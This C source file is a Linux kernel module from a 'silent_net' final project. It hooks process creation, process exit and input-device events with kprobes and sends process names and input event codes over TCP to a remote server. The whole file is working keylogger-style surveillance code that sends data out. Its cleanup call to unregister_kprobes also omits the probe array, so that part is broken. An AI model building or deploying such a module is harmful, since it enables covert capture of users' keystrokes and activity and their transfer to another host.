/*
 * This is a source code of the client side
 * Of 'silent_net' project.
 *
 * blah blah blah
 *
 *
 */

#include "headers.h"
#include "protocol.h"
#include "workqueue.h"
#include "tcp_socket.h"
#include "kClientHook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omer Kfir");
MODULE_DESCRIPTION("Final project");

/* Kprobes structures */
static struct kprobe kps[PROBES_SIZE] = {
    [kp_do_fork] = 
    {
        .pre_handler = handler_pre_do_fork,
        .symbol_name = HOOK_PROCESS_FORK
    },
    [kp_do_exit] = 
    {
        .pre_handler = handler_pre_do_exit,
        .symbol_name = HOOK_PROCESS_EXIT
    },
    [kp_input_event] = 
    {
    	.pre_handler = handler_pre_input_event,
	.symbol_name = HOOK_INPUT_EVENT
    }
};

/* Global socket variables */
static struct socket *sock; // Socket struct
static bool sock_connected = false; // Boolean value indicating if socket is connected
static struct mutex sock_mutex; // Mutex lock socket handling
static struct workqueue_struct *tcp_sock_wq; // Workqueue for sending tcp socket messages

/* Attemps to send data to server side */
static void transmit_data(struct work_struct *work)
{
	wq_msg *curr_msg = container_of(work, wq_msg, work);
	int ret;

    	mutex_lock(&sock_mutex);

    	/* If socket is disconnected try to connect */
    	if ( !sock_connected ) 
    	{
        	/* When a socket disconnects a new socket needs to be created */
        	sock = tcp_sock_create();
        	if ( IS_ERR(sock) ) 
		{
            		sock = NULL;
            		goto end;
        	}

        	ret = tcp_sock_connect(sock, DEST_IP, DEST_PORT);    
        	if ( ret < 0 ) 
		{
            		tcp_sock_close(sock);
            		sock = NULL;
            		goto end;
        	}
		sock_connected = true;
    	}

    	ret = tcp_send_msg(sock, curr_msg->msg_buf, curr_msg->length);
    	if ( ret < 0 ) 
    	{
        	sock_connected = false;
        	tcp_sock_close(sock);
        	sock = NULL;
    	}

end:
    	mutex_unlock(&sock_mutex);
    	kfree(curr_msg);  // Free the work structure
}

/* Fork hook */
static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs)
{
    	char msg_buf[BUFFER_SIZE];
    	size_t msg_length;
	
	if ( !current )
		return 0;
	
	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s", MSG_PROCESS_OPEN, current->comm);
	if ( msg_length > 0)
		workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);

	return 0;
}

/* Process termination hook */
static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs)
{
        char msg_buf[BUFFER_SIZE];
        size_t msg_length;

	if ( !current )
		return 0;
	
	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s", MSG_PROCESS_CLOSE, current->comm);
        if ( msg_length > 0)
                workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);

        return 0;

}

/* Device input events */
static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs)
{
        char msg_buf[BUFFER_SIZE];
        size_t msg_length;

	struct input_dev *dev;
	unsigned int code;

	if ( !regs ) // Checking current is irrelevant due to interrupts
		return 0;

	dev = (struct input_dev *)regs->di; // First parameter
	code = (unsigned int)regs->dx; 	    // Third paramater
	
	msg_length = protocol_format(msg_buf, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%d", MSG_INPUT_EVENT, dev->name, code);

	if ( msg_length > 0 )
		workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);

	return 0;
}

static int __init hook_init(void)
{
    	int ret = 0;    

    	/* Create workqueue */
    	tcp_sock_wq = create_singlethread_workqueue("tcp_sock_queue");
    	if ( !tcp_sock_wq ) 
	{
        	ret = -ENOMEM;
        	goto end;
    	}

    	mutex_init(&sock_mutex);

		/* Registers kprobes, if one fails unregisters all registered kprobes */
    	ret = register_kprobes(kps, PROBES_SIZE);
    	if ( ret < 0 )
        	goto cleanup_wq;

    	return 0;

cleanup_wq:
    	destroy_workqueue(tcp_sock_wq);
end:
    	return ret;
}

static void __exit hook_exit(void)
{
	/* Close safely all module basic objects */
    	flush_workqueue(tcp_sock_wq);
    	destroy_workqueue(tcp_sock_wq);

	tcp_sock_close(sock);
	unregister_kprobes(PROBES_SIZE);

	printk(KERN_INFO "Unregisterd kernel probes");
}

module_init(hook_init);
module_exit(hook_exit);
